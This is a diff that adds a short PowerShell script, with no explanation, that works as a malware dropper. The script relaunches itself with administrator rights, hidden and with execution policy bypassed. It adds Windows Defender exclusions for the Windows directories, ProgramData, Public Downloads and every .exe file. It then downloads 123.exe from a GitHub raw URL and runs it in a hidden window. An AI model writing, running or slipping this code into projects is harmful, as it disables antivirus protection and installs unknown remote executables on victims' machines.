@@ -1,0 +1,21 @@
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+  Start-Process PowerShell -Verb runas -ArgumentList "-ExecutionPolicy Bypass", "-WindowStyle Hidden", $script:scriptblock
+  Exit
+}
+
+$scriptblock = {
+  Add-MpPreference -ExclusionPath 'C:\ProgramData'
+  Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'
+  Add-MpPreference -ExclusionPath 'C:\Windows\System32'
+  Add-MpPreference -ExclusionPath 'C:\Windows\SysWOW64'
+  Add-MpPreference -ExclusionPath 'C:\Windows'
+  Add-MpPreference -ExclusionExtension '.exe'
+
+  $url = 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/123.exe'
+  $downloadPath = 'C:\temp\123.exe'
+
+  Invoke-WebRequest -Uri $url -OutFile $downloadPath
+  Start-Process $downloadPath -WindowStyle Hidden
+}
+
+Invoke-Expression $scriptblock
